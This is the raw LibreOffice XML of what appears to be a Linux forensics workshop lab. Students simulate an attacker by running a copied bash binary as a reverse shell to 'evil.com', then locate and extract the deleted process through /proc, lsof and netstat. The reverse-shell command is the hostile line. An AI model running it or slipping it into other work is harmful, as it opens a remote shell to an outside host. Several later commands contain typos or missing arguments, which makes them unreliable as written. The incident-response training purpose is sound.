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line-height="135%" fo:background-color="#ffffff"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <loext:graphic-properties draw:fill="solid" draw:fill-color="#ffffff"/>
      <style:paragraph-properties fo:line-height="135%" fo:background-color="#ffffff"/>
      <style:text-properties fo:font-size="12pt" style:font-size-asian="12pt" style:font-size-complex="12pt"/>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loext:graphic-properties draw:fill="solid" draw:fill-color="#ffffff"/>
      <style:paragraph-properties fo:margin-left="0.5in" fo:margin-right="0in" fo:line-height="135%" fo:text-indent="-0.25in" style:auto-text-indent="false" fo:background-color="#ffffff"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Title" style:master-page-name="Standard">
      <loext:graphic-properties draw:fill="solid" draw:fill-color="#ffffff"/>
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in" loext:contextual-spacing="false" fo:line-height="150%" fo:text-align="justify" style:justify-single-word="false" style:page-number="1" fo:background-color="#ffffff"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties fo:color="#3d85c6"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00"/>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fo:background-color="#ffff00"/>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size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" fo:background-color="#ffff00"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:font-size="12pt" fo:background-color="#c9daf8" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:font-size="12pt" fo:background-color="#f9cb9c" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T1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ezdddk6r246o"/><text:span text:style-name="T1">Case #4: Hunt a Deleted Suspicious Process!</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T2">The goal of this lab is to simulate the idea of a suspicious process that was run by a threat actor and then deleted it so no traces were left behind. But, let them believe what they want, as long as the system is running, we can track this process down and even extract it, while the system is still running.</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1"><text:span text:style-name="T4">Deliverables:</text:span></text:p>
      <text:list xml:id="list393724201" text:style-name="WWNum2">
        <text:list-item>
          <text:p text:style-name="P4"><text:span text:style-name="T2">Create a fake malicious reverse bash shell.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P4"><text:span text:style-name="T2">Run the shell in the background and then delete.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P4"><text:span text:style-name="T2">Show that you can find, list, and then extract the process from /proc even though the process has been deleted.</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P1"><text:span text:style-name="T4">Outcomes:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T2">At the end of this lab, you will have acquired skills to deal with a compromised Linux system, where you will be capable of:</text:span></text:p>
      <text:list xml:id="list3096836601" text:style-name="WWNum1">
        <text:list-item>
          <text:p text:style-name="P5"><text:span text:style-name="T2">Tracking running processes</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P5"><text:span text:style-name="T2">Using the procfs features to the benefit of your IR</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P5"><text:span text:style-name="T2">Extracting the process from memory</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T5">Note:</text:span><text:span text:style-name="T3"> please use tables and screenshots to represent your results if needed. Like I usually say “</text:span><text:span text:style-name="T7">Screenshot or it didn’t happen!</text:span><text:span text:style-name="T3">”.</text:span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T6">Task #1: Copy bash and name it backdoor</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T2">$ cp /bin/bash /tmp/backdoor</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T6">Task #2: Create a reverse bash shell</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T8">Create a netcat listener on your system or on another system if you have one:</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T2">$ nc -lvp 8080</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T8">Now run your backdoor</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T2">$ /tmp/backdoor -i &gt;&amp; /dev/tcp/evil.com/8080 0&gt;&amp;1</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T6">Task #3: Use netstat, /proc, and lsof to find the suspicious process</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T2">$ netstat -lpeanut</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T2">$ lsof -p &lt;PID&gt;</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T2">$ ps aux | grep &lt;PID&gt;</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T2">$ ps aux | grep &lt;Pname&gt;</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T2">$ ls /proc/&lt;PID&gt;</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T6">Task #4: Extract and compare the value</text:span></text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/><text:span text:style-name="T2">$ cp /proc/&lt;PID&gt;/exe</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T9">Q: Did that work and why?</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T2">No, because it’s not a true file, therefore let’s use “cat” instead</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T2">$ cat /proc/&lt;PID&gt;/exe &gt; fakeprocess</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T8">Then get the hash:</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T2">$ md5sum fackprocess</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T8">Now let’s search for this process using find:</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T2">$ sudo find / -type f -exec {}\; | grep &lt;fakeprocess-hash&gt;</text:span></text:p>
      <text:p text:style-name="P2"/>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OSDFCon<text:tab/><text:tab/><text:tab/>Linux Forensics Workshop<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>2019</text:span></text:p>
      </style:header>
      <style:footer>
        <text:p text:style-name="Standard">Last updated: 1007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6" meta:word-count="324" meta:character-count="1767" meta:non-whitespace-character-count="1479"/>
    <meta:generator>LibreOfficeDev/6.0.5.2$Linux_X86_64 LibreOffice_project/</meta:generator>
  </office:meta>
</office:document-meta>
</file>